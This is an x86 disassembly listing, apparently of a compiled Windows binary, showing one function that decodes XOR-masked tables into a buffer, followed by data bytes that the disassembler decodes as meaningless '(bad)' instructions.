  43b21e:	sub    edx,0x401e6
  43b224:	neg    edx
  43b226:	sbb    edx,edx
  43b228:	and    edx,0xc8287113
  43b22e:	add    edx,0x37d79380
  43b234:	xor    edx,eax
  43b236:	mov    ds:0x448d10,eax
  43b23b:	mov    DWORD PTR [ecx],edx
  43b23d:	mov    edx,DWORD PTR ds:0x4480d0
  43b243:	add    edx,0x8
  43b246:	mov    DWORD PTR ds:0x4480d0,edx
  43b24c:	movzx  eax,BYTE PTR [edx+0x7]
  43b250:	movzx  edi,BYTE PTR [edx+0x4]
  43b254:	movzx  edx,WORD PTR [edx]
  43b257:	shl    eax,0x8
  43b25a:	add    eax,edi
  43b25c:	shl    eax,0x10
  43b25f:	add    eax,edx
  43b261:	mov    edx,DWORD PTR ds:0x448d1c
  43b267:	sub    edx,0x401e6
  43b26d:	neg    edx
  43b26f:	sbb    edx,edx
  43b271:	and    edx,0xc8287113
  43b277:	add    edx,0x37d79380
  43b27d:	xor    edx,eax
  43b27f:	mov    ds:0x448d10,eax
  43b284:	mov    DWORD PTR [ecx+0x4],edx
  43b287:	mov    edx,DWORD PTR ds:0x4480d0
  43b28d:	add    edx,0x8
  43b290:	mov    DWORD PTR ds:0x4480d0,edx
  43b296:	movzx  eax,BYTE PTR [edx+0x7]
  43b29a:	movzx  edi,BYTE PTR [edx+0x4]
  43b29e:	movzx  edx,WORD PTR [edx]
  43b2a1:	shl    eax,0x8
  43b2a4:	add    eax,edi
  43b2a6:	shl    eax,0x10
  43b2a9:	add    eax,edx
  43b2ab:	mov    edx,DWORD PTR ds:0x448d1c
  43b2b1:	sub    edx,0x401e6
  43b2b7:	neg    edx
  43b2b9:	sbb    edx,edx
  43b2bb:	and    edx,0xc8287113
  43b2c1:	add    edx,0x37d79380
  43b2c7:	xor    edx,eax
  43b2c9:	mov    ds:0x448d10,eax
  43b2ce:	mov    DWORD PTR [ecx+0x8],edx
  43b2d1:	mov    edx,DWORD PTR ds:0x4480d0
  43b2d7:	add    edx,0x8
  43b2da:	mov    DWORD PTR ds:0x4480d0,edx
  43b2e0:	movzx  eax,BYTE PTR [edx+0x7]
  43b2e4:	movzx  edi,BYTE PTR [edx+0x4]
  43b2e8:	movzx  edx,WORD PTR [edx]
  43b2eb:	shl    eax,0x8
  43b2ee:	add    eax,edi
  43b2f0:	shl    eax,0x10
  43b2f3:	add    eax,edx
  43b2f5:	mov    edx,DWORD PTR ds:0x448d1c
  43b2fb:	sub    edx,0x401e6
  43b301:	neg    edx
  43b303:	sbb    edx,edx
  43b305:	and    edx,0xc8287113
  43b30b:	add    edx,0x37d79380
  43b311:	xor    edx,eax
  43b313:	mov    ds:0x448d10,eax
  43b318:	mov    DWORD PTR [ecx+0xc],edx
  43b31b:	mov    edx,DWORD PTR ds:0x4480d0
  43b321:	add    edx,0x8
  43b324:	mov    DWORD PTR ds:0x4480d0,edx
  43b32a:	movzx  eax,BYTE PTR [edx+0x7]
  43b32e:	movzx  edi,BYTE PTR [edx+0x4]
  43b332:	shl    eax,0x8
  43b335:	add    eax,edi
  43b337:	shl    eax,0x10
  43b33a:	movzx  edx,WORD PTR [edx]
  43b33d:	add    eax,edx
  43b33f:	mov    edx,DWORD PTR ds:0x448d1c
  43b345:	sub    edx,0x401e6
  43b34b:	neg    edx
  43b34d:	sbb    edx,edx
  43b34f:	and    edx,0xc8287113
  43b355:	add    edx,0x37d79380
  43b35b:	xor    edx,eax
  43b35d:	mov    ds:0x448d10,eax
  43b362:	mov    DWORD PTR [ecx+0x10],edx
  43b365:	mov    edx,DWORD PTR ds:0x4480d0
  43b36b:	add    edx,0x8
  43b36e:	add    ecx,0x14
  43b371:	dec    esi
  43b372:	mov    DWORD PTR ds:0x4480d0,edx
  43b378:	jne    0x43b203
  43b37e:	mov    esi,DWORD PTR ds:0x448d20
  43b384:	mov    eax,ds:0x4480d4
  43b389:	add    esi,0x4b48
  43b38f:	mov    edi,0x2ae
  43b394:	movzx  ecx,WORD PTR [eax+0x5]
  43b398:	movzx  edx,BYTE PTR [eax+0x3]
  43b39c:	movzx  eax,BYTE PTR [eax]
  43b39f:	push   0x0
  43b3a1:	push   0x143
  43b3a6:	push   0x13a
  43b3ab:	shl    ecx,0x8
  43b3ae:	push   0xaa
  43b3b3:	add    ecx,edx
  43b3b5:	push   0x20
  43b3b7:	shl    ecx,0x8
  43b3ba:	push   0x0
  43b3bc:	add    ecx,eax
  43b3be:	push   ebp
  43b3bf:	mov    DWORD PTR ds:0x448d10,ecx
  43b3c5:	call   ebx
  43b3c7:	mov    ecx,0x9abf23b3
  43b3cc:	sub    ecx,DWORD PTR ds:0x448d1c
  43b3d2:	add    esi,0x4
  43b3d5:	xor    ecx,DWORD PTR ds:0x448d10
  43b3db:	mov    DWORD PTR [esi-0x4],ecx
  43b3de:	mov    eax,ds:0x4480d4
  43b3e3:	add    eax,0x8
  43b3e6:	dec    edi
  43b3e7:	mov    ds:0x4480d4,eax
  43b3ec:	jne    0x43b394
  43b3ee:	call   0x440280
  43b3f3:	mov    esi,DWORD PTR ds:0x448d20
  43b3f9:	mov    ecx,DWORD PTR ds:0x4480d8
  43b3ff:	add    esi,0x5fe4
  43b405:	lea    edx,[edi+0x44]
  43b408:	jmp    0x43b410
  43b40a:	lea    ebx,[ebx+0x0]
  43b410:	movzx  eax,BYTE PTR [ecx+0x6]
  43b414:	movzx  edi,WORD PTR [ecx+0x4]
  43b418:	movzx  ecx,BYTE PTR [ecx]
  43b41b:	shl    eax,0x10
  43b41e:	add    eax,edi
  43b420:	shl    eax,0x8
  43b423:	add    eax,ecx
  43b425:	mov    ds:0x448d10,eax
  43b42a:	mov    ecx,0xffced0eb
  43b42f:	sub    ecx,DWORD PTR ds:0x448d1c
  43b435:	xor    ecx,eax
  43b437:	mov    DWORD PTR [esi],ecx
  43b439:	mov    ecx,DWORD PTR ds:0x4480d8
  43b43f:	movzx  eax,BYTE PTR [ecx+0xf]
  43b443:	movzx  edi,WORD PTR [ecx+0xd]
  43b447:	movzx  ecx,BYTE PTR [ecx+0x7]
  43b44b:	shl    eax,0x10
  43b44e:	add    eax,edi
  43b450:	shl    eax,0x8
  43b453:	add    eax,ecx
  43b455:	mov    ecx,DWORD PTR ds:0x448d1c
  43b45b:	sub    ecx,0x401e6
  43b461:	neg    ecx
  43b463:	sbb    ecx,ecx
  43b465:	mov    ds:0x448d10,eax
  43b46a:	and    ecx,0x355b30
  43b470:	add    ecx,0xffcacf05
  43b476:	xor    ecx,eax
  43b478:	mov    DWORD PTR [esi+0x4],ecx
  43b47b:	mov    ecx,DWORD PTR ds:0x4480d8
  43b481:	add    ecx,0x10
  43b484:	mov    DWORD PTR ds:0x4480d8,ecx
  43b48a:	movzx  eax,BYTE PTR [ecx+0x6]
  43b48e:	movzx  edi,WORD PTR [ecx+0x4]
  43b492:	movzx  ecx,BYTE PTR [ecx]
  43b495:	shl    eax,0x10
  43b498:	add    eax,edi
  43b49a:	shl    eax,0x8
  43b49d:	add    eax,ecx
  43b49f:	mov    ds:0x448d10,eax
  43b4a4:	mov    ecx,0xffced0eb
  43b4a9:	sub    ecx,DWORD PTR ds:0x448d1c
  43b4af:	xor    ecx,eax
  43b4b1:	mov    DWORD PTR [esi+0x8],ecx
  43b4b4:	mov    ecx,DWORD PTR ds:0x4480d8
  43b4ba:	movzx  eax,BYTE PTR [ecx+0xf]
  43b4be:	movzx  edi,WORD PTR [ecx+0xd]
  43b4c2:	movzx  ecx,BYTE PTR [ecx+0x7]
  43b4c6:	shl    eax,0x10
  43b4c9:	add    eax,edi
  43b4cb:	shl    eax,0x8
  43b4ce:	add    eax,ecx
  43b4d0:	mov    ecx,DWORD PTR ds:0x448d1c
  43b4d6:	sub    ecx,0x401e6
  43b4dc:	neg    ecx
  43b4de:	sbb    ecx,ecx
  43b4e0:	and    ecx,0x355b30
  43b4e6:	mov    ds:0x448d10,eax
  43b4eb:	add    ecx,0xffcacf05
  43b4f1:	xor    ecx,eax
  43b4f3:	mov    DWORD PTR [esi+0xc],ecx
  43b4f6:	mov    ecx,DWORD PTR ds:0x4480d8
  43b4fc:	add    ecx,0x10
  43b4ff:	mov    DWORD PTR ds:0x4480d8,ecx
  43b505:	movzx  eax,BYTE PTR [ecx+0x6]
  43b509:	movzx  edi,WORD PTR [ecx+0x4]
  43b50d:	movzx  ecx,BYTE PTR [ecx]
  43b510:	shl    eax,0x10
  43b513:	add    eax,edi
  43b515:	shl    eax,0x8
  43b518:	add    eax,ecx
  43b51a:	mov    ecx,0xffced0eb
  43b51f:	sub    ecx,DWORD PTR ds:0x448d1c
  43b525:	mov    ds:0x448d10,eax
  43b52a:	xor    ecx,eax
  43b52c:	mov    DWORD PTR [esi+0x10],ecx
  43b52f:	mov    ecx,DWORD PTR ds:0x4480d8
  43b535:	movzx  eax,BYTE PTR [ecx+0xf]
  43b539:	movzx  edi,WORD PTR [ecx+0xd]
  43b53d:	shl    eax,0x10
  43b540:	add    eax,edi
  43b542:	movzx  ecx,BYTE PTR [ecx+0x7]
  43b546:	shl    eax,0x8
  43b549:	add    eax,ecx
  43b54b:	mov    ecx,DWORD PTR ds:0x448d1c
  43b551:	sub    ecx,0x401e6
  43b557:	neg    ecx
  43b559:	sbb    ecx,ecx
  43b55b:	and    ecx,0x355b30
  43b561:	add    ecx,0xffcacf05
  43b567:	xor    ecx,eax
  43b569:	mov    ds:0x448d10,eax
  43b56e:	mov    DWORD PTR [esi+0x14],ecx
  43b571:	mov    ecx,DWORD PTR ds:0x4480d8
  43b577:	add    ecx,0x10
  43b57a:	mov    DWORD PTR ds:0x4480d8,ecx
  43b580:	movzx  eax,BYTE PTR [ecx+0x6]
  43b584:	movzx  edi,WORD PTR [ecx+0x4]
  43b588:	movzx  ecx,BYTE PTR [ecx]
  43b58b:	shl    eax,0x10
  43b58e:	add    eax,edi
  43b590:	shl    eax,0x8
  43b593:	add    eax,ecx
  43b595:	mov    ds:0x448d10,eax
  43b59a:	mov    ecx,0xffced0eb
  43b59f:	sub    ecx,DWORD PTR ds:0x448d1c
  43b5a5:	xor    ecx,eax
  43b5a7:	mov    DWORD PTR [esi+0x18],ecx
  43b5aa:	mov    ecx,DWORD PTR ds:0x4480d8
  43b5b0:	movzx  eax,BYTE PTR [ecx+0xf]
  43b5b4:	movzx  edi,WORD PTR [ecx+0xd]
  43b5b8:	movzx  ecx,BYTE PTR [ecx+0x7]
  43b5bc:	shl    eax,0x10
  43b5bf:	add    eax,edi
  43b5c1:	shl    eax,0x8
  43b5c4:	add    eax,ecx
  43b5c6:	mov    ecx,DWORD PTR ds:0x448d1c
  43b5cc:	sub    ecx,0x401e6
  43b5d2:	neg    ecx
  43b5d4:	sbb    ecx,ecx
  43b5d6:	and    ecx,0x355b30
  43b5dc:	add    ecx,0xffcacf05
  43b5e2:	xor    ecx,eax
  43b5e4:	mov    ds:0x448d10,eax
  43b5e9:	mov    DWORD PTR [esi+0x1c],ecx
  43b5ec:	mov    ecx,DWORD PTR ds:0x4480d8
  43b5f2:	add    ecx,0x10
  43b5f5:	add    esi,0x20
  43b5f8:	dec    edx
  43b5f9:	mov    DWORD PTR ds:0x4480d8,ecx
  43b5ff:	jne    0x43b410
  43b605:	mov    ebp,DWORD PTR ds:0x44501c
  43b60b:	lea    edx,[esp+0x20]
  43b60f:	push   edx
  43b610:	push   0x0
  43b612:	push   0x3
  43b614:	call   ebp
  43b616:	mov    ecx,DWORD PTR ds:0x4480d8
  43b61c:	movzx  eax,BYTE PTR [ecx+0x6]
  43b620:	movzx  edx,WORD PTR [ecx+0x4]
  43b624:	movzx  ecx,BYTE PTR [ecx]
  43b627:	shl    eax,0x10
  43b62a:	add    eax,edx
  43b62c:	mov    edx,DWORD PTR ds:0x448d1c
  43b632:	shl    eax,0x8
  43b635:	add    eax,ecx
  43b637:	xor    edx,eax
  43b639:	xor    edx,0xffcecee3
  43b63f:	mov    ds:0x448d10,eax
  43b644:	mov    DWORD PTR [esi],edx
  43b646:	call   0x40fb70
  43b64b:	lea    eax,[esp+0x20]
  43b64f:	push   eax
  43b650:	push   0x0
  43b652:	push   0x3
  43b654:	call   ebp
  43b656:	mov    edx,DWORD PTR ds:0x448d20
  43b65c:	mov    ecx,DWORD PTR ds:0x4480dc
  43b662:	add    edx,0x5b78
  43b668:	mov    esi,0x11b
  43b66d:	lea    ecx,[ecx+0x0]
  43b670:	movzx  eax,WORD PTR [ecx+0x6]
  43b674:	movzx  ecx,WORD PTR [ecx+0x1]
  43b678:	shl    eax,0x10
  43b67b:	add    eax,ecx
  43b67d:	mov    ecx,0xaf53b8c6
  43b682:	sub    ecx,DWORD PTR ds:0x448d1c
  43b688:	mov    ds:0x448d10,eax
  43b68d:	xor    ecx,eax
  43b68f:	mov    DWORD PTR [edx],ecx
  43b691:	mov    ecx,DWORD PTR ds:0x4480dc
  43b697:	add    ecx,0x8
  43b69a:	add    edx,0x4
  43b69d:	dec    esi
  43b69e:	mov    DWORD PTR ds:0x4480dc,ecx
  43b6a4:	jne    0x43b670
  43b6a6:	mov    edx,DWORD PTR [esp+0x1c]
  43b6aa:	push   esi
  43b6ab:	push   0xcf
  43b6b0:	push   0x142
  43b6b5:	push   0x4c
  43b6b7:	push   0xe6
  43b6bc:	push   esi
  43b6bd:	push   edx
  43b6be:	call   ebx
  43b6c0:	mov    esi,DWORD PTR ds:0x448d20
  43b6c6:	mov    ecx,DWORD PTR ds:0x4480e0
  43b6cc:	add    esi,0x6868
  43b6d2:	mov    edi,0x140
  43b6d7:	jmp    0x43b6e0
  43b6d9:	lea    esp,[esp+0x0]
  43b6e0:	movzx  eax,BYTE PTR [ecx+0x7]
  43b6e4:	movzx  edx,WORD PTR [ecx+0x3]
  43b6e8:	movzx  ecx,BYTE PTR [ecx]
  43b6eb:	shl    eax,0x10
  43b6ee:	add    eax,edx
  43b6f0:	mov    edx,DWORD PTR ds:0x448d1c
  43b6f6:	shl    eax,0x8
  43b6f9:	add    eax,ecx
  43b6fb:	mov    ds:0x448d10,eax
  43b700:	add    edx,0xbbc4ac5
  43b706:	xor    edx,eax
  43b708:	mov    DWORD PTR [esi],edx
  43b70a:	mov    ecx,DWORD PTR ds:0x4480e0
  43b710:	movzx  eax,BYTE PTR [ecx+0xe]
  43b714:	movzx  edx,WORD PTR [ecx+0xb]
  43b718:	movzx  ecx,BYTE PTR [ecx+0x9]
  43b71c:	push   0x0
  43b71e:	shl    eax,0x10
  43b721:	add    eax,edx
  43b723:	push   0xe3
  43b728:	push   0x81
  43b72d:	shl    eax,0x8
  43b730:	push   0x62
  43b732:	add    eax,ecx
  43b734:	mov    edx,0xbc44e91
  43b739:	sub    edx,DWORD PTR ds:0x448d1c
  43b73f:	push   0x4a
  43b741:	mov    ds:0x448d10,eax
  43b746:	xor    edx,eax
  43b748:	mov    eax,DWORD PTR [esp+0x2c]
  43b74c:	push   0x0
  43b74e:	mov    DWORD PTR [esi+0x4],edx
  43b751:	push   eax
  43b752:	add    esi,0x8
  43b755:	call   ebx
  43b757:	mov    ecx,DWORD PTR ds:0x4480e0
  43b75d:	add    ecx,0x10
  43b760:	dec    edi
  43b761:	mov    DWORD PTR ds:0x4480e0,ecx
  43b767:	jne    0x43b6e0
  43b76d:	push   0xe3
  43b772:	push   0x42
  43b774:	call   DWORD PTR ds:0x445014
  43b77a:	test   eax,eax
  43b77c:	je     0x43b785
  43b77e:	push   eax
  43b77f:	call   DWORD PTR ds:0x44502c
  43b785:	lea    ecx,[esp+0x20]
  43b789:	push   ecx
  43b78a:	push   0x0
  43b78c:	push   0x3
  43b78e:	call   ebp
  43b790:	mov    edi,DWORD PTR ds:0x448d20
  43b796:	mov    esi,0x41b2b0
  43b79b:	add    edi,0x4658
  43b7a1:	add    esi,0x4
  43b7a4:	mov    ebx,0x9e
  43b7a9:	lea    esp,[esp+0x0]
  43b7b0:	push   0x0
  43b7b2:	call   DWORD PTR ds:0x445024
  43b7b8:	movzx  eax,WORD PTR [esi+0x2]
  43b7bc:	movzx  edx,BYTE PTR [esi]
  43b7bf:	movzx  ecx,BYTE PTR [esi-0x2]
  43b7c3:	shl    eax,0x8
  43b7c6:	add    eax,edx
  43b7c8:	mov    edx,DWORD PTR ds:0x448d1c
  43b7ce:	shl    eax,0x8
  43b7d1:	add    eax,ecx
  43b7d3:	mov    ds:0x448d10,eax
  43b7d8:	add    edx,0xcf5b8e1f
  43b7de:	xor    edx,eax
  43b7e0:	mov    DWORD PTR [edi],edx
  43b7e2:	movzx  eax,BYTE PTR [esi+0xa]
  43b7e6:	movzx  ecx,WORD PTR [esi+0x6]
  43b7ea:	movzx  edx,BYTE PTR [esi+0x4]
  43b7ee:	shl    eax,0x10
  43b7f1:	add    eax,ecx
  43b7f3:	mov    ecx,DWORD PTR ds:0x448d1c
  43b7f9:	sub    ecx,0x401e6
  43b7ff:	shl    eax,0x8
  43b802:	add    eax,edx
  43b804:	neg    ecx
  43b806:	sbb    ecx,ecx
  43b808:	and    ecx,0x30a0c05c
  43b80e:	add    ecx,0xcf5f9005
  43b814:	xor    ecx,eax
  43b816:	mov    ds:0x448d10,eax
  43b81b:	mov    DWORD PTR [edi+0x4],ecx
  43b81e:	add    edi,0x8
  43b821:	add    esi,0x10
  43b824:	dec    ebx
  43b825:	jne    0x43b7b0
  43b827:	lea    edx,[esp+0x20]
  43b82b:	push   edx
  43b82c:	push   ebx
  43b82d:	push   0x3
  43b82f:	call   ebp
  43b831:	mov    esi,DWORD PTR ds:0x448d20
  43b837:	mov    ecx,DWORD PTR ds:0x4480e4
  43b83d:	add    esi,0x7948
  43b843:	mov    edi,0x13e
  43b848:	jmp    0x43b850
  43b84a:	lea    ebx,[ebx+0x0]
  43b850:	movzx  eax,WORD PTR [ecx+0x6]
  43b854:	movzx  ecx,WORD PTR [ecx+0x2]
  43b858:	shl    eax,0x10
  43b85b:	add    eax,ecx
  43b85d:	mov    ds:0x448d10,eax
  43b862:	mov    edx,0x63ce996
  43b867:	sub    edx,DWORD PTR ds:0x448d1c
  43b86d:	xor    edx,eax
  43b86f:	mov    DWORD PTR [esi],edx
  43b871:	mov    eax,ds:0x4480e4
  43b876:	movzx  ecx,WORD PTR [eax+0xc]
  43b87a:	movzx  edx,WORD PTR [eax+0x9]
  43b87e:	lea    eax,[esp+0x20]
  43b882:	push   eax
  43b883:	shl    ecx,0x10
  43b886:	push   0x0
  43b888:	add    ecx,edx
  43b88a:	push   0x3
  43b88c:	mov    DWORD PTR ds:0x448d10,ecx
  43b892:	call   ebp
  43b894:	mov    ecx,0x63ce996
  43b899:	sub    ecx,DWORD PTR ds:0x448d1c
  43b89f:	add    esi,0x8
  43b8a2:	xor    ecx,DWORD PTR ds:0x448d10
  43b8a8:	mov    DWORD PTR [esi-0x4],ecx
  43b8ab:	mov    ecx,DWORD PTR ds:0x4480e4
  43b8b1:	add    ecx,0x10
  43b8b4:	dec    edi
  43b8b5:	mov    DWORD PTR ds:0x4480e4,ecx
  43b8bb:	jne    0x43b850
  43b8bd:	lea    edx,[esp+0x20]
  43b8c1:	push   edx
  43b8c2:	push   edi
  43b8c3:	push   0x3
  43b8c5:	call   ebp
  43b8c7:	mov    ecx,DWORD PTR ds:0x4480e4
  43b8cd:	movzx  eax,WORD PTR [ecx+0x6]
  43b8d1:	movzx  ecx,WORD PTR [ecx+0x2]
  43b8d5:	shl    eax,0x10
  43b8d8:	add    eax,ecx
  43b8da:	mov    edx,0x63ce996
  43b8df:	sub    edx,DWORD PTR ds:0x448d1c
  43b8e5:	pop    edi
  43b8e6:	xor    edx,eax
  43b8e8:	mov    ds:0x448d10,eax
  43b8ed:	mov    eax,DWORD PTR [esp+0xc]
  43b8f1:	mov    DWORD PTR [esi],edx
  43b8f3:	pop    esi
  43b8f4:	pop    ebp
  43b8f5:	pop    ebx
  43b8f6:	test   eax,eax
  43b8f8:	je     0x43b901
  43b8fa:	push   eax
  43b8fb:	call   DWORD PTR ds:0x44502c
  43b901:	mov    eax,DWORD PTR [esp+0x4]
  43b905:	test   eax,eax
  43b907:	je     0x43b910
  43b909:	push   eax
  43b90a:	call   DWORD PTR ds:0x44502c
  43b910:	add    esp,0x32c
  43b916:	ret    
  43b917:	int3   
  43b918:	int3   
  43b919:	int3   
  43b91a:	int3   
  43b91b:	int3   
  43b91c:	int3   
  43b91d:	int3   
  43b91e:	int3   
  43b91f:	int3   
  43b920:	mov    ah,0x0
  43b922:	loopne 0x43b8a7
  43b924:	ins    DWORD PTR es:[edi],dx
  43b925:	(bad)  
  43b926:	inc    DWORD PTR [ebx+0x9ebd6f]
  43b92c:	out    0x83,al
  43b92e:	inc    DWORD PTR [ebx+0x9ec3f1]
  43b934:	pop    ds
  43b935:	add    bh,bh
  43b937:	int3   
  43b938:	inc    ebx
  43b939:	dec    ebp
  43b93a:	push   ebx
  43b93b:	add    ah,ah
  43b93d:	add    DWORD PTR [eax],0xffffffcc
  43b940:	inc    edi
  43b941:	aad    0x75
  43b943:	ds add bh,bh
  43b946:	dec    esp
  43b948:	fwait
  43b949:	rcl    DWORD PTR [edi],1
  43b94b:	clc    
  43b94c:	add    BYTE PTR [eax],al
  43b94e:	(bad)  
  43b94f:	call   edi
  43b951:	or     dl,BYTE PTR [ebx]
  43b953:	pop    ds
  43b954:	add    bh,bh
  43b956:	add    BYTE PTR [eax],al
  43b958:	xchg   edi,eax
  43b959:	cmp    dh,bh
  43b95b:	dec    edx
  43b95c:	add    DWORD PTR [ebx+0x77e48300],0xffffffde
  43b963:	iret   
  43b964:	(bad)  
  43b965:	(bad)  
  43b966:	(bad)  
  43b967:	(bad)  
  43b968:	push   DWORD PTR [eax+eax*4-0x7c3c]
  43b96f:	push   ebx
  43b971:	enter  0xcd09,0x0
  43b975:	inc    DWORD PTR [ebx+0x177a4600]
  43b97b:	jns    0x43b97d
  43b97d:	inc    DWORD PTR [eax]
  43b97f:	call   FWORD PTR [esi-0x9fb1e8]
  43b985:	int3   
  43b986:	inc    DWORD PTR [eax]
  43b988:	ins    DWORD PTR es:[edi],dx
  43b989:	popa   
  43b98a:	mov    ebx,0xffccff93
  43b98f:	sub    DWORD PTR [ecx-0xaaad38],0xffffffff
  43b996:	inc    DWORD PTR [eax]
  43b998:	fxch   st(6)
  43b99a:	hlt    
  43b99b:	outs   dx,DWORD PTR ds:[esi]
  43b99c:	add    BYTE PTR [eax],al
  43b99e:	add    BYTE PTR [ebx-0x4058f8b0],al
  43b9a4:	(bad)  
  43b9a5:	dec    esp
  43b9a7:	add    ebx,0x6f
  43b9aa:	or     eax,0x83cc53
  43b9af:	dec    DWORD PTR [ecx-0xe7e8a1]
  43b9b5:	dec    DWORD PTR [ecx+0x46d86aff]
  43b9bb:	jmp    0x1e50:0xffff8300
  43b9c2:	xor    edx,DWORD PTR [ebx]
  43b9c4:	add    BYTE PTR [ecx-0x51abff7d],cl
  43b9ca:	inc    esi
  43b9cb:	ror    ah,1
  43b9cd:	inc    DWORD PTR [eax]
  43b9cf:	add    bl,bl
  43b9d1:	les    ecx,FWORD PTR ds:0xffcc00e6
  43b9d7:	dec    DWORD PTR [eax]
  43b9d9:	push   edx
  43b9da:	out    dx,eax
  43b9db:	mov    esi,0xffff8389
  43b9e0:	and    esp,0xffff29f4
  43b9e6:	(bad)  
  43b9e7:	push   DWORD PTR [ecx+eax*1]
  43b9ea:	push   edi
  43b9eb:	mov    ?,edi
  43b9ed:	add    BYTE PTR [eax],al
  43b9ef:	(bad)  
  43b9f0:	cmp    BYTE PTR [ebx-0x358a],cl
  43b9f6:	int3   
  43b9f7:	(bad)  
  43b9f8:	jmp    0x43b9f3
  43b9fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b9fb:	repz add ah,cl
  43b9fe:	inc    DWORD PTR [eax]
  43ba00:	mov    ebp,0x956075
  43ba05:	add    BYTE PTR [eax],al
  43ba07:	call   DWORD PTR [edx+0x3e8042]
  43ba0d:	(bad)  
  43ba0e:	inc    DWORD PTR [eax]
  43ba10:	stos   DWORD PTR es:[edi],eax
  43ba11:	(bad)  
  43ba12:	in     eax,0xcb
  43ba14:	dec    esp
  43ba16:	add    bh,bh
  43ba18:	clc    
  43ba19:	dec    esp
  43ba1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ba1b:	cli    
  43ba1c:	(bad)  
  43ba1d:	(bad)  
  43ba1e:	(bad)  
  43ba1f:	jmp    FWORD PTR ds:0xff6c09e7
  43ba25:	add    DWORD PTR [eax],0xffffff83
  43ba28:	mov    esi,0xff064742
  43ba2d:	add    BYTE PTR [eax],al
  43ba2f:	(bad)  
  43ba30:	jle    0x43ba92
  43ba32:	iret   
  43ba33:	and    esp,ecx
  43ba35:	dec    esp
  43ba37:	dec    DWORD PTR [ebx-0x7c2d35b2]
  43ba3d:	inc    DWORD PTR [eax]
  43ba3f:	(bad)  
  43ba40:	(bad)  
  43ba42:	mov    dh,cl
  43ba44:	add    BYTE PTR [ecx+0x4683ff00],cl
  43ba4a:	and    BYTE PTR [edi],ah
  43ba4c:	add    bh,bh
  43ba4e:	add    BYTE PTR [ebx-0x65d0295a],al
  43ba54:	add    BYTE PTR [ecx+0x31910000],cl
  43ba5a:	lods   al,BYTE PTR ds:[esi]
  43ba5b:	retf   0xccff
  43ba5e:	int3   
  43ba5f:	(bad)  
  43ba60:	jmp    0x43b9eb
  43ba62:	mov    ds:0x83ff00ce,al
  43ba67:	inc    DWORD PTR [esi-0x22e803]
  43ba6d:	(bad)  
  43ba6e:	inc    DWORD PTR [ebx-0x36d6cb74]
  43ba74:	add    BYTE PTR [eax],al
  43ba76:	dec    esp
  43ba78:	out    0x52,eax
  43ba7a:	sar    BYTE PTR [edi-0x1],0xcc
  43ba7e:	mov    DWORD PTR [eax],eax
  43ba80:	inc    edx
  43ba81:	ja     0x43ba14
  43ba83:	js     0x43ba85
  43ba85:	mov    edi,edi
  43ba87:	push   DWORD PTR [eax]
  43ba89:	out    dx,eax
  43ba8a:	out    0x20,eax
  43ba8c:	add    BYTE PTR [eax],al
  43ba8e:	add    ah,cl
  43ba90:	mov    eax,0xff61ec18
  43ba95:	cmp    edi,0xffffffff
  43ba98:	sbb    al,0x87
  43ba9a:	dec    esi
  43ba9b:	sub    edi,edi
  43ba9d:	add    DWORD PTR [eax],0x0
  43baa0:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  43baa2:	ds iret 
  43baa4:	add    BYTE PTR [eax],al
  43baa6:	(bad)  
  43baa7:	dec    esi
  43baa9:	pop    esi
  43baaa:	push   edi
  43baab:	jno    0x43baad
  43baad:	dec    esp
  43baaf:	int3   
  43bab0:	mov    ch,0xb
  43bab2:	mov    al,0x4e
  43bab4:	add    bh,bh
  43bab6:	inc    DWORD PTR [eax]
  43bab8:	mov    ecx,0xff28d51c
  43babd:	add    BYTE PTR [eax],al
  43babf:	add    BYTE PTR [eax],dl
  43bac1:	dec    eax
  43bac2:	inc    edx
  43bac3:	mov    esp,0xffff8389
  43bac8:	or     al,0xe5
  43baca:	out    0x5d,al
  43bacc:	dec    esp
  43bace:	(bad)  
  43bacf:	jmp    DWORD PTR [ecx-0x6e]
  43bad2:	dec    BYTE PTR ds:0xff0089
  43bad8:	mul    dh
  43bada:	mov    bl,0x99
  43badc:	(bad)  
  43badd:	(bad)  
  43bade:	dec    DWORD PTR [ecx-0x2c9c5578]
  43bae4:	inc    DWORD PTR [eax]
  43bae6:	(bad)  
  43bae7:	inc    DWORD PTR [ebp-0xb61220]
  43baed:	(bad)  
  43baee:	inc    DWORD PTR [eax]
  43baf0:	cli    
  43baf1:	adc    BYTE PTR [edx-0x767600af],bh
  43baf7:	call   FWORD PTR [esi+0x71]
  43bafa:	sbb    al,0x54
  43bafc:	add    BYTE PTR [eax],al
  43bafe:	add    DWORD PTR [eax],0xffffffdf
  43bb01:	loop   0x43babf
  43bb03:	pop    ecx
  43bb04:	cmp    edi,0xffffffff
  43bb07:	add    BYTE PTR [ecx-0xe2d870],ah
  43bb0d:	inc    DWORD PTR [eax]
  43bb0f:	call   ebp
  43bb11:	popf   
  43bb12:	call   0x5fff:0xffffffeb
  43bb19:	cld    
  43bb1a:	out    dx,eax
  43bb1b:	in     al,0xff
  43bb1d:	inc    DWORD PTR [eax]
  43bb1f:	mov    DWORD PTR [edi-0x23],esp
  43bb22:	and    ebx,esi
  43bb24:	cmp    edi,0xffffffff
  43bb27:	add    BYTE PTR ds:0xff14ed08,al
  43bb2d:	(bad)  
  43bb2e:	(bad)  
  43bb2f:	jmp    FWORD PTR [edx+0xaceb8a]
  43bb35:	int3   
  43bb36:	(bad)  
  43bb37:	jmp    DWORD PTR [edx]
  43bb39:	std    
  43bb3a:	les    ebp,FWORD PTR [ebp-0x77]
  43bb3d:	add    bh,bh
  43bb3f:	jmp    DWORD PTR [ecx]
  43bb41:	inc    edx
  43bb42:	jb     0x43bb2b
  43bb44:	int3   
  43bb45:	int3   
  43bb46:	inc    DWORD PTR [ebx-0x38a1762d]
  43bb4c:	inc    DWORD PTR [ebx+0x2d9c8900]
  43bb52:	retf   
  43bb53:	inc    ebp
  43bb54:	int3   
  43bb55:	cmp    edi,0xffffff83
  43bb58:	loop   0x43bbc0
  43bb5a:	pop    ds
  43bb5b:	dec    esi
  43bb5c:	(bad)  
  43bb5d:	(bad)  
  43bb5e:	inc    DWORD PTR [eax]
  43bb60:	ret    
  43bb61:	das    
  43bb62:	stos   DWORD PTR es:[edi],eax
  43bb63:	mov    al,BYTE PTR [ebx-0xf000077]
  43bb69:	add    ebp,0x8366
  43bb6f:	dec    DWORD PTR [ebx]
  43bb71:	arpl   bp,bp
  43bb73:	mov    al,ds:0x8900cc00
  43bb78:	or     DWORD PTR [edi-0x64],edx
